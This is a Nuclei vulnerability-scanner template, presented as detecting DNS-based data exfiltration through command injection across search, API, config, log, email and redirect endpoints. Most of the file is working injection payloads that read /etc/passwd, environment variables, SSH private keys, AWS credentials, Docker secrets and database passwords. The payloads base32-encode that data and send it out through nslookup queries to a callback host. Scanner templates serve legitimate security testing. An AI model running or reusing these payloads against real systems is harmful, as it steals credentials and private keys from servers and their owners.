http:
- method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/'
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/profile'
  - '{{BaseURL}}/admin'
  - '{{BaseURL}}/config'
  - '{{BaseURL}}/debug'
  payloads:
    param:
    - q
    - search
    - query
    - filter
    - cmd
    - debug
    - test
    - eval
    - exec
  raw:
  - 'GET {{path}}?{{param}}={{dns_exfil_payload}} HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Connection: close

    '
- body: '{{param}}={{dns_exfil_payload}}'
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: POST
  path:
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/api/search'
  - '{{BaseURL}}/query'
  - '{{BaseURL}}/eval'
  - '{{BaseURL}}/exec'
  payloads:
    param:
    - q
    - query
    - search
    - cmd
    - command
    - eval
    - expression
- body: "{\n  \"{{field}}\": \"{{dns_exfil_payload}}\"\n}\n"
  headers:
    Accept: application/json
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/api'
  - '{{BaseURL}}/graphql'
  - '{{BaseURL}}/api/eval'
  payloads:
    field:
    - query
    - search
    - expression
    - command
    - eval
- body: "{\n  \"dns_server\": \"{{callback_url}}\",\n  \"lookup_command\": \"nslookup\
    \ $(echo '{{test_data}}' | base32).config.{{callback_url}}\",\n  \"resolver\"\
    : \"$(nslookup test.{{callback_url}})\"\n}\n"
  headers:
    Content-Type: application/json
  method: PUT
  path:
  - '{{BaseURL}}/config'
  - '{{BaseURL}}/settings'
  - '{{BaseURL}}/admin/config'
- body: "{\n  \"message\": \"Error: $(nslookup $(echo 'LOG_DATA_{{exfil_id}}' | base32).log.{{callback_url}})\"\
    ,\n  \"level\": \"debug\",\n  \"context\": \"$(nslookup $(date | base32).timestamp.{{callback_url}})\"\
    \n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/log'
  - '{{BaseURL}}/admin/log'
  - '{{BaseURL}}/debug/log'
- body: "{\n  \"email\": \"test@$(nslookup $(echo 'EMAIL_TEST_{{exfil_id}}' | base32).email.{{callback_url}})\"\
    ,\n  \"message\": \"DNS lookup test\",\n  \"subject\": \"Test $(nslookup $(echo\
    \ 'SUBJECT_{{exfil_id}}' | base32).subject.{{callback_url}})\"\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/email'
  - '{{BaseURL}}/contact'
  - '{{BaseURL}}/feedback'
- extractors:
  - internal: true
    kval:
    - interactsh_request
    part: interactsh_request
    type: kval
  - group: 1
    name: extracted_data
    part: interactsh_request
    regex:
    - ([A-Z2-7]{8,})\.([a-z]+)\.
    type: regex
  - group: 2
    name: extracted_type
    part: interactsh_request
    regex:
    - ([A-Z2-7]{8,})\.([a-z]+)\.
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - ^([^.]+)
    type: regex
  matchers:
  - condition: and
    part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: or
    part: interactsh_request
    type: word
    words:
    - .start.
    - .passwd.
    - .env.
    - .user.
    - .network.
    - .processes.
    - .sshkey.
    - .dbpass.
    - .aws.
    - .docker.
    - .config.
    - .log.
    - .email.
    - .subject.
    - .redirect.
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/redirect'
  - '{{BaseURL}}/proxy'
  payloads:
    param:
    - url
    - target
    - redirect
  raw:
  - 'GET {{path}}?{{param}}=http://$(nslookup $(echo ''REDIRECT_{{exfil_id}}'' | base32).redirect.{{callback_url}})
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

    Connection: close

    '
id: dns-data-exfiltration-base32-oob
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-200,CWE-212
  description: 'Detects vulnerabilities that allow data exfiltration through DNS queries
    using

    Base32 encoding for steganographic data transmission. Tests various injection

    points that could leak sensitive information via DNS lookups with error

    correction and data integrity verification.

    '
  name: DNS Data Exfiltration with Base32 Encoding OOB
  reference:
  - https://book.hacktricks.xyz/pentesting-web/dns-rebinding
  - https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/
  - https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152
  - https://attack.mitre.org/techniques/T1048/003/
  severity: high
  tags: dns,exfiltration,base32,steganography,oob,data-leak,covert-channel
variables:
  callback_url: '{{interactsh-url}}'
  dns_exfil_payload: '# Linux/Unix DNS exfiltration payloads with Base32 encoding


    # Basic command execution with DNS exfiltration

    $(nslookup "$(echo ''{{test_data}}'' | base32 | tr -d ''='' | head -c 20).start.{{callback_url}}")


    # File content exfiltration

    $(nslookup "$(cat /etc/passwd | base32 | tr -d ''='' | head -c 30).passwd.{{callback_url}}")


    # Environment variable exfiltration

    $(nslookup "$(env | base32 | tr -d ''='' | head -c 25).env.{{callback_url}}")


    # Current user and working directory

    $(nslookup "$(whoami | base32).$(pwd | base32 | head -c 15).user.{{callback_url}}")


    # Network interface information

    $(nslookup "$(ifconfig | base32 | head -c 20).network.{{callback_url}}")


    # Process list exfiltration

    $(nslookup "$(ps aux | base32 | head -c 30).processes.{{callback_url}}")


    # SSH keys exfiltration

    $(nslookup "$(cat ~/.ssh/id_rsa 2>/dev/null | base32 | head -c 40).sshkey.{{callback_url}}")


    # Database connection strings

    $(nslookup "$(grep -r "password" /var/www/ 2>/dev/null | base32 | head -c 35).dbpass.{{callback_url}}")


    # AWS credentials exfiltration

    $(nslookup "$(cat ~/.aws/credentials 2>/dev/null | base32 | head -c 45).aws.{{callback_url}}")


    # Docker secrets

    $(nslookup "$(find /var/lib/docker -name "*.json" -exec cat {} \; 2>/dev/null
    | base32 | head -c 30).docker.{{callback_url}}")

    '
  exfil_id: '{{randstr}}'
  test_data: SECRET_DATA_{{randstr}}
